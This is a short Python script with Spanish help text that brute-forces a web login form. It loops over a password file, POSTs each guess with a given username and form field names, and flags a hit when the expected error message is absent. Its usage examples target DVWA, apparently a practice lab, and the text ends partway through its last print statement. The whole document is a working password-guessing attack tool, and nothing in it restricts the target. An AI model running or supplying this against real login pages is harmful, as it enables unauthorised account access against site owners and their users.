#!/usr/bin/env python

import requests
import argparse
from colorama import init, Fore

init(autoreset=True)

GREEN = Fore.GREEN
CYAN = Fore.CYAN
RED = Fore.RED
YELLOW = Fore.YELLOW

parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", dest="url", help="URL objetivo: loginGuess.py -u http://10.0.2.27/dvwa/login.php")
parser.add_argument("-l", "--login-user", dest="loginuser", help="Usuario a emplear para login. loginGuesspy -u http://10.0.2.27/dvwa/login.php -l admin -pf password.txt")
parser.add_argument("-pf", "--pass-file", dest="passfile", help="Archivo con las contraseñas, una por línea. loginGuess.py -u http://10.0.2.27/dvwa/login.php -pf password.txt")
parser.add_argument("-e", "--error-word", dest="errorw", help="Mensaje/s de error. loginGuess.py -u http://10.0.2.27/dvwa/login.php -l admin -pf password.txt -e Failed")
parser.add_argument("-na", "--name-attribute", dest="nameattr", help="Valor del atributo 'name'. loginGuess.py -u http://10.0.2.27/dvwa/login.php -l admin -pf password.txt -e Failed -na username")
parser.add_argument("-pa", "--password-attribute", dest="passattr", help="Valor del atributo 'name' en el campo password. loginGuess.py -u http://10.0.2.27/dvwa/login.php -l admin -pf password.txt -e Failed -pa password")

options = parser.parse_args()

with open(options.passfile, "r") as passFile:
    for password in passFile.read().splitlines():
        if password != "":
            data = {options.nameattr: options.loginuser, options.passattr: password, "Login": "submit"}
            response = requests.post(options.url, data=data)
            
            print (f"{YELLOW}[+] Probando {CYAN}{options.loginuser} {YELLOW}con {CYAN}{password}")

            if not str(options.errorw).lower() in str(response.content):
                print (f"\n{RED}[+] El usuario {GREEN}{options.loginuser} {RED}con la contraseña {GREEN}{password} {RED}ha funcionado!\n"
